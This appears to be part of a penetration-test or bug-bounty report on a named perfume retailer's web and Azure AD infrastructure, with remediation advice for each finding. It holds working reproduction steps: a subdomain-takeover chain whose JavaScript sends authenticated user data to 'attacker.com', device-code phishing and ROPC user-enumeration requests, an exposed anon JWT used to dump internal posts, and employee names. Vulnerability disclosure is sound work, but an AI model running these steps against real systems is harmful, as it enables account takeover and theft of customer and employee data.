## Finding #12: Subdomain Takeover via Dangling CloudFront CNAME — CORS Chain to Critical
**Severity**: Critical (Subdomain Takeover + Credential Theft Chain)
**Domain**: refer.theperfumeshop.com

### Description
The subdomain `refer.theperfumeshop.com` has a DNS CNAME record pointing to `d21ht8kxzkwbio.cloudfront.net`, a CloudFront distribution that no longer exists. The CloudFront distribution domain returns no A records (only SOA), confirming it has been disabled or deleted while the DNS record remains. An attacker can create a new CloudFront distribution, add `refer.theperfumeshop.com` as an alternate domain name, and serve arbitrary content under the trusted `*.theperfumeshop.com` domain.

**This finding chains directly with Finding #10 (CORS wildcard with credentials) to escalate from subdomain takeover to full authenticated API credential theft — making this a Critical chain.**

### Steps to Reproduce
1. Query the CNAME record:
   ```
   $ curl -s "https://dns.google/resolve?name=refer.theperfumeshop.com&type=CNAME"
   {"Answer":[{"name":"refer.theperfumeshop.com.","type":5,"TTL":1800,"data":"d21ht8kxzkwbio.cloudfront.net."}]}
   ```
2. Verify the CloudFront distribution is dead (no A records):
   ```
   $ curl -s "https://dns.google/resolve?name=d21ht8kxzkwbio.cloudfront.net&type=A"
   {"Authority":[{"name":"cloudfront.net.","type":6,"TTL":60,"data":"ns-418.awsdns-52.com. hostmaster.cloudfront.net. ..."}]}
   # No Answer section = no A record = distribution deleted/disabled
   ```
3. Compare with an active CloudFront distribution (from techsale CSP):
   ```
   $ curl -s "https://dns.google/resolve?name=d2q01ftr6ua4w.cloudfront.net&type=A"
   {"Answer":[{"data":"3.170.21.64"},{"data":"3.170.21.135"},{"data":"3.170.21.71"},{"data":"3.170.21.47"}]}
   # Active distribution returns 4 edge IPs
   ```
4. Takeover: create a new CloudFront distribution with `refer.theperfumeshop.com` as an alternate domain, configure an ACM certificate, and point the origin to attacker-controlled content.

### Attack Chain (Finding #12 + Finding #10 = Critical)
```
1. Attacker claims refer.theperfumeshop.com via CloudFront subdomain takeover
2. Attacker hosts malicious JavaScript at https://refer.theperfumeshop.com/steal.html
3. Victim visits attacker page (via phishing link or redirect)
4. JavaScript executes under *.theperfumeshop.com origin
5. CORS policy allows the request with credentials (Finding #10):
   - Origin: https://refer.theperfumeshop.com → reflected in access-control-allow-origin
   - access-control-allow-credentials: true
6. JavaScript fetches authenticated API endpoints:

   fetch('https://api.theperfumeshop.com/api/v2/tpsgb/users/current', {
     credentials: 'include'
   }).then(r => r.json()).then(data => {
     // Exfiltrate: name, email, phone, addresses, orders, saved payments
     new Image().src = 'https://attacker.com/log?' + btoa(JSON.stringify(data));
   });
```

**Additional vector — Clickjacking via CSP frame-ancestors wildcard:**
The main site's CSP header is `frame-ancestors 'self' *.theperfumeshop.com`, which allows any subdomain to iframe the main e-commerce site. After takeover, the attacker can embed `www.theperfumeshop.com` in a transparent iframe on `refer.theperfumeshop.com` and perform UI redressing attacks (tricking users into clicking actions on the real site).

### Impact
- **Critical**: Full credential theft chain — attacker reads victim's authenticated API data (PII, orders, saved payment methods, addresses) from the main e-commerce platform
- **Critical**: Actions as victim — attacker can modify cart, change delivery address, place fraudulent orders
- **High**: Persistent control — once the subdomain is taken over, the attacker maintains long-term control until the DNS record is removed or the distribution is reclaimed
- **High**: No detection — requests appear to originate from a legitimate theperfumeshop.com subdomain; Akamai WAF and CORS policies treat them as trusted

### CVSS 4.0
**9.3** (Critical) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N

### Recommendation
1. **Immediate**: Remove the DNS CNAME record for `refer.theperfumeshop.com` → `d21ht8kxzkwbio.cloudfront.net`
2. **Immediate**: Audit ALL DNS records for other dangling CNAMEs pointing to deprovisioned cloud services
3. **Immediate**: Fix the CORS wildcard pattern (Finding #10) — this eliminates the chain even if other subdomains are compromised
4. **Short-term**: Implement DNS record lifecycle management — automatically remove CNAMEs when cloud resources are deprovisioned
5. **Short-term**: Enable AWS CloudFront Origin Access Control and domain verification to prevent unauthorized distribution claims

---

## Finding #13: Azure AD Misconfiguration — Device Code Phishing, ROPC User Enumeration, Elevated Scope Requests
**Severity**: High (Account Takeover via Phishing + User Enumeration)
**Domain**: techsale.theperfumeshop.com (Supabase OAuth → Azure AD)

### Description
The Azure AD application registration used by techsale's Supabase OAuth (client_id: `7053b019-d535-4ade-ad68-a6d266e7ad68`, tenant: `5c8208f9-b560-4909-903b-5a5cc5b1d45a`) has multiple dangerous authentication flows enabled:

1. **Device Code Flow**: Allows an attacker to generate device codes that trick employees into authenticating on the attacker's behalf. The victim is shown a legitimate Microsoft login page and a device code, and after authenticating, the attacker receives their OAuth tokens.

2. **ROPC (Resource Owner Password Credentials) Grant**: Enables direct username/password authentication without browser interaction, bypassing MFA unless enforced at the Conditional Access level. This enables credential stuffing and brute force attacks.

3. **User Enumeration**: The ROPC endpoint returns different error codes for existing vs. non-existing users (50053 "locked" vs. 50034 "does not exist"), enabling username enumeration.

4. **Elevated Scope Acceptance**: Device code generation accepts arbitrary Microsoft Graph scopes including `Mail.Read`, `Files.ReadWrite.All`, and `https://graph.microsoft.com/.default` — the victim would be prompted to consent to these permissions.

### Steps to Reproduce

**Device Code Phishing:**
```bash
# Generate a device code — victim enters this at https://login.microsoft.com/device
$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/devicecode" \
  -d "client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid profile email"

{"user_code":"L7JA2TMSL","device_code":"LBgABIQ...","verification_uri":"https://login.microsoft.com/device","expires_in":900}
```

**Elevated Scope Device Code:**
```bash
# Request dangerous scopes — Mail.Read, Files.ReadWrite.All
$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/devicecode" \
  -d "client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid profile email Mail.Read Files.ReadWrite.All"

{"user_code":"GQZ8WJRSU",...}  # Accepted — victim would be prompted for consent
```

**ROPC User Enumeration:**
```bash
# Existing user returns 50053 (locked)
$ curl -X POST "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/token" \
  -d "grant_type=password&client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&scope=openid&username=admin@tps.com&password=test"

{"error_codes":[50053],"error_description":"The account is locked..."}

# Non-existing user returns 50034
$ curl -X POST "..." -d "...&username=nonexistent@tps.com&password=test"

{"error_codes":[50034],"error_description":"The user account does not exist..."}
```

**Domain Discovery:**
- `tps.com` is a verified domain in the tenant (error 50053 for admin@ = user exists)
- `theperfumeshop.com` is NOT in this tenant (error 50034 for all users)
- `aswatson.com` is NOT in this tenant

### Evidence
| Test | Error Code | Meaning |
|------|-----------|---------|
| admin@tps.com | 50053 | User EXISTS (account locked) |
| test@tps.com | 50034 | User does NOT exist |
| admin@theperfumeshop.com | 50034 | Domain not in tenant |
| admin@aswatson.com | 50034 | Domain not in tenant |

### Impact
- **High**: Device code phishing enables account takeover — attacker generates codes and phishes employees into authenticating, gaining access to corporate resources (email, files, internal apps)
- **High**: ROPC enables credential stuffing — with enumerated usernames, an attacker can attempt password spraying directly against the API without browser interaction
- **High**: User enumeration reveals valid corporate accounts — attackers can build targeted username lists for phishing and password attacks
- **Medium**: Elevated scope requests could escalate access — a phished employee consenting to `Mail.Read` or `Files.ReadWrite.All` gives the attacker access to corporate email and OneDrive
- **Medium**: The `tps.com` domain revelation expands the attack surface beyond `theperfumeshop.com`

### CVSS 4.0
**8.1** (High) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Disable Device Code Flow on the application registration (Azure Portal → App registrations → Authentication → Advanced settings → Allow public client flows = No)
2. **Immediate**: Disable ROPC grant type or enforce Conditional Access policies requiring MFA for all authentication flows
3. **Short-term**: Enable Smart Lockout with lower thresholds to slow user enumeration
4. **Short-term**: Restrict the application's API permissions to only required scopes (openid, profile, email) and require admin consent for any additional Graph permissions
5. **Medium-term**: Implement Conditional Access policies blocking device code flow and ROPC for all users
6. **Medium-term**: Enable Azure AD sign-in risk detection to alert on suspicious authentication patterns

---

## Finding #15: Broken Access Control — Unauthenticated Read Access to Internal Corporate Posts via Supabase PostgREST
**Severity**: High (Broken Access Control / Unauthorized Data Access)
**Domain**: scentral.theperfumeshop.com → fsqcbhgehkpoqwrlpdnf.supabase.co

### Description
The Scentral intranet application (Hublio) uses a second Supabase project (`fsqcbhgehkpoqwrlpdnf`) whose anonymous API key is exposed in the client-side JavaScript bundle (`/assets/index-DestaOsG.js`). The `posts` table has a permissive Row-Level Security (RLS) SELECT policy that allows the `anon` role to read all rows. This exposes **71 internal corporate posts** — including employee names, business strategy, compliance directives, and leadership communications — to any unauthenticated attacker.

Additionally, **open email signup** is enabled on this Supabase project (`disable_signup: false`), allowing anyone to create an account. Thirteen tables are accessible at the API level: `profiles`, `events`, `campaigns`, `notifications`, `announcements`, `posts`, `hubs`, `organisations`, `communities`, `community_members`, `hub_members`, `poll_options`, `poll_votes`.

### Steps to Reproduce
1. Extract the Supabase anon key from the scentral client-side JavaScript:
   ```
   curl -s https://scentral.theperfumeshop.com/assets/index-DestaOsG.js | grep -oP 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_.-]+'
   ```
2. Query the posts table using the anon key:
   ```
   curl -s "https://fsqcbhgehkpoqwrlpdnf.supabase.co/rest/v1/posts?limit=5" \
     -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZzcWNiaGdlaGtwb3F3cmxwZG5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU4NDczMTcsImV4cCI6MjA5MTQyMzMxN30.DgpcxObmZZmeNAa4ROC7SPskhLoIHgA5ecMa7fEGqjE" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZzcWNiaGdlaGtwb3F3cmxwZG5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU4NDczMTcsImV4cCI6MjA5MTQyMzMxN30.DgpcxObmZZmeNAa4ROC7SPskhLoIHgA5ecMa7fEGqjE"
   ```
3. Observe 71 internal posts returned including employee names, business strategy, and compliance training content.
4. Verify open signup:
   ```
   curl -s -X POST "https://fsqcbhgehkpoqwrlpdnf.supabase.co/auth/v1/signup" \
     -H "apikey: <anon_key>" -H "Content-Type: application/json" \
     -d '{"email":"attacker@example.com","password":"password123"}'
   ```
   Returns 200 with user ID and `role: "authenticated"`.

### Evidence
**Exposed data (sample from 71 posts):**

| Post Type | Title | Sensitive Content |
|-----------|-------|-------------------|
| announcement | Mandatory Allergen Labelling Training — Complete by April 30 | EU Cosmetics Regulation compliance details, staff training requirements |
| leadership | Our Sustainability Pledge: Refillable Packaging by 2027 | Business strategy roadmap with quarterly milestones, cost projections (25% packaging cost reduction), supplier partnerships |
| shoutout | Customer service save of the month | Employee names (Priya, Stephen Port, Craig Keenan, Meshach Leigertwood) |
| poll | Which scent family should our Autumn 2026 collection explore? | Unreleased product strategy |
| announcement | Cyber Security Acceptable Use Policy — Q2 Refresh | Internal security policy information |

**16 unique internal employee/author UUIDs** exposed via the `author_id` field.
**Organisation ID**: `2ae333e1-2854-48ef-8b10-ffa6da51f45f`

**Auth settings confirm open signup:**
```json
{"external":{"email":true},"disable_signup":false,"mailer_autoconfirm":false}
```

### Impact
- **High**: Unauthorized access to 71 internal corporate communications including business strategy, financial projections, and compliance directives
- **High**: Employee PII exposure — real names visible in shoutout posts and content
- **Medium**: Internal organizational structure and team names revealed
- **Medium**: Unreleased product strategy (Autumn 2026 collection, sustainability roadmap with specific dates and partners)
- **Medium**: Open signup allows creation of accounts in the corporate Supabase project, potentially escalating access if RLS policies grant broader permissions to authenticated users

### CVSS 4.0
**8.2** (High) - CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N

### Recommendation
1. **Immediate**: Add restrictive RLS SELECT policy on the `posts` table requiring `auth.uid()` check — deny reads for the `anon` role
2. **Immediate**: Disable open signup on the Supabase project (`disable_signup: true`) or restrict to corporate email domains
3. **Short-term**: Audit RLS policies on all 13 accessible tables to ensure anon role has no read/write access to internal data
4. **Short-term**: Review whether the anon key needs to be exposed in client-side code — consider proxying Supabase calls through a backend that validates authentication first

---

## Finding #16: OAuth Redirect URI Takeover via Abandoned Lovable.dev Project and Dangling Domain
**Severity**: High (OAuth Security / Account Takeover Chain)
**Domain**: scentral.theperfumeshop.com → Azure AD app registration

### Description
The Azure AD app registration (client_id: `7053b019-d535-4ade-ad68-a6d266e7ad68`) used by the Scentral intranet has four hardcoded redirect URIs for its admin consent flow, two of which point to abandoned external services:

1. `https://scentral.theperfumeshop.com/adminconsent-callback.html` — **Active** (current deployment)
2. `https://id-preview--0f95779a-51bc-46c4-85e8-f79290528466.lovable.app/adminconsent-callback.html` — **401** (preview environment)
3. `https://brilliant-workplace.lovable.app/adminconsent-callback.html` — **404 "Project not found"** (deleted Lovable project)
4. `https://hubliointranet.site/adminconsent-callback.html` — **No A record** (dangling domain on Azure DNS)

Azure AD accepts all four redirect URIs for authorization code flow, implicit flow, and admin consent flow. The admin consent flow requests extremely dangerous Microsoft Graph permissions: `Sites.Manage.All`, `GroupMember.Read.All`, `User.Read.All`, `Group.ReadWrite.All`.

### Steps to Reproduce
1. Confirm the deleted Lovable project:
   ```
   curl -s https://brilliant-workplace.lovable.app/
   # Returns 404 "No Lovable project found at this address"
   ```
2. Verify Azure AD accepts the abandoned redirect URI:
   ```
   curl -sD- "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/oauth2/v2.0/authorize?client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&response_type=code&redirect_uri=https://brilliant-workplace.lovable.app/adminconsent-callback.html&scope=openid+profile"
   # Returns 200 OK with Azure AD login page — redirect URI accepted
   ```
3. Verify the admin consent endpoint also accepts it:
   ```
   curl -sD- "https://login.microsoftonline.com/5c8208f9-b560-4909-903b-5a5cc5b1d45a/adminconsent?client_id=7053b019-d535-4ade-ad68-a6d266e7ad68&redirect_uri=https://brilliant-workplace.lovable.app/adminconsent-callback.html"
   # Returns 200 OK — admin consent redirect URI accepted
   ```

### Evidence
**Hardcoded redirect URIs** extracted from scentral JavaScript (`/assets/index-DestaOsG.js`):
```javascript
[
  {label: "Current",       url: window.location.origin + "/adminconsent-callback.html"},
  {label: "Preview",       url: "https://id-preview--0f95779a-...lovable.app/adminconsent-callback.html"},
  {label: "Published",     url: "https://brilliant-workplace.lovable.app/adminconsent-callback.html"},
  {label: "Custom domain", url: "https://hubliointranet.site/adminconsent-callback.html"}
]
```

**Admin consent scopes requested:**
- `Sites.Manage.All` — Create & manage SharePoint sites
- `GroupMember.Read.All` — Read M365 group memberships
- `User.Read.All` — Read user directory profiles
- `Group.ReadWrite.All` — Create & manage M365 groups

**DNS confirmation:**
- `brilliant-workplace.lovable.app` → A records 185.41.148.1/2 (Lovable/Cloudflare), returns 404
- `hubliointranet.site` → Azure DNS nameservers configured, NO A record

### Impact
- **High**: If an attacker claims the `brilliant-workplace` project name on Lovable.dev, they gain control of the redirect URI and can intercept OAuth authorization codes or admin consent tokens
- **High**: The admin consent flow grants `Sites.Manage.All`, `GroupMember.Read.All`, `User.Read.All`, `Group.ReadWrite.All` — full access to the M365 environment
- **Medium**: The `hubliointranet.site` domain has Azure DNS nameservers but no A record — if the DNS zone subscription lapses, the domain could be claimed
- **Medium**: The implicit flow (`response_type=token`) is also accepted with the abandoned redirect URI, enabling direct access token theft in the URL fragment

### CVSS 4.0
**8.1** (High) - CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N

### Recommendation
1. **Immediate**: Remove `brilliant-workplace.lovable.app` and `hubliointranet.site` from the Azure AD app registration's redirect URIs
2. **Immediate**: Remove the Lovable preview redirect URI if no longer in use
3. **Short-term**: Claim the `brilliant-workplace` project name on Lovable.dev preemptively to prevent attacker takeover
4. **Short-term**: Reduce the admin consent scopes to the minimum required (principle of least privilege)
5. **Medium-term**: Implement a redirect URI lifecycle management process — when external services are decommissioned, remove their redirect URIs from app registrations

---

## Additional Observations

### Akamai WAF (AkamaiGHost)
- `www.theperfumeshop.com` and `api.theperfumeshop.com` are protected by Akamai Bot Manager
- The WAF requires JavaScript-generated sensor data (bot management cookies: `_abck`, `bm_sz`, `bm_so`, `bm_s`) for API access
- Without valid sensor data, all OCC API requests return 403 even with valid session cookies
- The API error `{"errors":[{"message":"Page size not initialized on session","type":"IllegalStateError"}]}` confirms SAP Hybris Commerce Cloud backend
- Akamai blocks TRACE method requests but allows OPTIONS

### Technology Stack Summary
| Domain | Technology | Protection |
|--------|-----------|------------|
| www.theperfumeshop.com | SAP Hybris Commerce Cloud (Composable Storefront) | Akamai Bot Manager + WAF |
| api.theperfumeshop.com | Hybris OCC API v2 (prefix: /api/v2/) | Akamai Bot Manager + WAF |
| api-s1.theperfumeshop.com | Staging Hybris OCC API | Akamai WAF |
| media.theperfumeshop.com | Hybris Media CDN | Akamai |
| connect.theperfumeshop.com | Next.js + Microsoft Entra ID (NextAuth.js) | Azure Front Door |
| dev.connect.theperfumeshop.com | Next.js + Microsoft Entra ID (NextAuth.js) | Azure Front Door |
| test.connect.theperfumeshop.com | Next.js + Microsoft Entra ID (NextAuth.js) | Azure Front Door |
| techsale.theperfumeshop.com | Next.js Turbopack + Supabase + Entra ID | Azure App Service |
| scentral.theperfumeshop.com | Hublio (Vite SPA) + Supabase | Azure Static Web Apps |
| campaigns.theperfumeshop.com | Apache 2.4.62 Oracle Linux (default test page) | Akamai (partial) |
| ecom-data.theperfumeshop.com | Google Cloud (Frontend) | Google |
| SAP Backend | sd.cmb8j9fjhz-emea5aswa1-d1-public.model-t.cc.commerce.ondemand.com | IP-based (insufficient) |

### Payment Integrations
- Worldpay (card payments, Apple Pay, Google Pay)
- PayPal
- Klarna
- Clearpay/Afterpay

### Subdomain DNS Status (Dangling CNAMEs and Unresolvable Hosts)
| Subdomain | DNS Status | CNAME Target | Takeover Risk |
|-----------|-----------|--------------|---------------|
| refer.theperfumeshop.com | CNAME exists, target dead | d21ht8kxzkwbio.cloudfront.net | **CRITICAL** — CloudFront takeover (Finding #12) |
| prod-cc.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
| bp.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
| bpie.theperfumeshop.com | No A record (SOA only) | None (Akamai-managed) | Low |
| videogift.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |
| prod-k.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |
| promotions.theperfumeshop.com | NXDOMAIN | None | N/A (record deleted) |

---

## Recommendations (Priority Order)
1. **CRITICAL**: Fix RLS policy on scentral `posts` table — deny SELECT for `anon` role; 71 internal posts currently readable without authentication (Finding #15)
2. **CRITICAL**: Disable open signup on the scentral Supabase project or restrict to corporate email domains (Finding #15)
3. **CRITICAL**: Remove abandoned redirect URIs (`brilliant-workplace.lovable.app`, `hubliointranet.site`) from the Azure AD app registration immediately (Finding #16)
4. **CRITICAL**: Remove the DNS CNAME for `refer.theperfumeshop.com` → `d21ht8kxzkwbio.cloudfront.net` immediately — dangling CloudFront CNAME enables subdomain takeover (Finding #12)
5. **CRITICAL**: Replace wildcard subdomain CORS pattern (`*.theperfumeshop.com`) on api/media infrastructure with explicit origin allowlist — this eliminates the takeover→credential theft chain (Finding #10 + #12)
6. **CRITICAL**: Disable GitHub, Google, and Twitter authentication providers on scentral.theperfumeshop.com via `staticwebapp.config.json` route blocks (Finding #7)
7. **CRITICAL**: Restrict Azure AD authentication on scentral from `/common/` (multi-tenant) to the organization's specific tenant ID (Finding #7)
8. **HIGH**: Disable Device Code Flow and ROPC grant on the techsale Azure AD app registration (Finding #13)
9. **HIGH**: Add HttpOnly and Secure flags to PKCE code_verifier cookies and reduce Max-Age to 300 seconds (Finding #14)
10. **HIGH**: Implement server-side authorization scope validation on techsale OAuth flow; do not pass scope as client-controlled parameter (Finding #8)
11. **HIGH**: Reduce admin consent scopes to minimum required — `Sites.Manage.All` and `Group.ReadWrite.All` are excessive (Finding #16)
12. **HIGH**: Audit RLS policies on ALL 13 accessible scentral Supabase tables to ensure anon role has no read/write access (Finding #15)
13. **HIGH**: Decommission or secure abandoned subdomains and audit ALL DNS records for dangling CNAMEs (Findings #10, #12)
14. **Immediate**: Fix the internal origin leak on connect by setting `NEXTAUTH_URL` to the public-facing URL (Finding #1)
15. **Immediate**: Remove SAP Commerce Cloud backend hostname from client-side JavaScript (Finding #11)
16. **Short-term**: Restrict CSP `frame-ancestors` to explicit origins instead of `*.theperfumeshop.com` wildcard to prevent clickjacking via subdomain takeover
17. **Short-term**: Harden campaigns.theperfumeshop.com - disable directory listing, remove default Apache test page, or decommission (Finding #10 chain)
18. **Short-term**: Strip Supabase project identifiers from cookie names and CSP headers (Finding #2, #9)
19. **Short-term**: Remove stale Lync/SfB DNS records (Finding #4)
20. **Short-term**: Enforce Conditional Access policies requiring MFA for all authentication flows including ROPC and device code (Finding #13)
21. **Short-term**: Claim `brilliant-workplace` project on Lovable.dev preemptively to prevent attacker takeover (Finding #16)
22. **Medium-term**: Review Supabase RLS policies for the techsale application
23. **Medium-term**: Configure SAP Commerce Cloud backend to reject requests not from Akamai CDN
24. **Medium-term**: Implement DNS record lifecycle management — auto-remove CNAMEs when cloud resources are deprovisioned
25. **Medium-term**: Implement redirect URI lifecycle management — remove URIs from app registrations when external services are decommissioned (Finding #16)
